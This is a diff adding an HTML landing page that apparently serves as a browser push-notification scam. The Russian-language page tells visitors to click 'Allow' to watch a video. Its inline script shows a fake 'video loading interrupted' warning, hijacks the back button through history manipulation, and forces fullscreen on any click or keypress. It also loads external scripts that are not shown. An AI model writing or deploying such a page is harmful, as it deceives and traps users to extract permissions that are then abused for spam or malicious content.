@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Welcome</title>
+	 <script type="text/javascript" src="/approved.js"></script>
+	
+	<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: black;
+    }
+
+    .img_cen {
+        cursor: pointer;
+        width: 180px;
+        margin: 0 auto;
+    }
+
+    .txt_cen {
+        margin: 15% auto 3%;
+    }
+
+    .p_ctr {
+        color: #fff;
+        font-family: Roboto, Arial, sans-serif;
+        text-align: center;
+        font-size: 39px;
+    }
+
+    </style>
+   
+</head>
+<body>
+	<div>
+	    <div class="txt_cen">
+	        <p class="p_ctr" style="color:#fff;">нажмите Разрешить чтобы посмотреть видео</p>
+	    </div>
+	    <div class="img_cen">
+	        <img style="width:100%;" src="assets/arr.png">
+	    </div>
+	</div>
+
+
+	<script>
+		console.log(getCookie('sub'))
+        if ( getCookie('sub') == '1' ) alert("** Предупреждение **\nЗагрузка видео прервана.\nНажмите 'Разрешить', чтобы продолжить загрузку.");
+
+	    if (window.history && window.history.pushState) {
+
+	        window.history.pushState('forward', null, '');
+
+	        window.addEventListener('popstate', function (event){
+	            window.location = '';
+	        });
+	  }
+
+	    var body = document.body;
+	    body.onclick = function () {
+	        var req = body.requestFullScreen || body.webkitRequestFullScreen || body.mozRequestFullScreen;
+	        req.call(body);
+	                        };
+
+	    var FullScreen = function () {
+	        if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+	            if (document.documentElement.requestFullscreen) {
+	                document.documentElement.requestFullscreen();
+	            } else if (document.documentElement.mozRequestFullScreen) {
+	                document.documentElement.mozRequestFullScreen();
+	            } else if (document.documentElement.webkitRequestFullscreen) {
+	                document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+	            }
+	        }
+	    };
+
+	    document.addEventListener('keydown', function (e) {
+	        if (e.keyCode) {
+	            FullScreen();
+	        }
+	    }, false);
+	</script>
+	<script src="/client.js"></script>
+</body>
+</html>
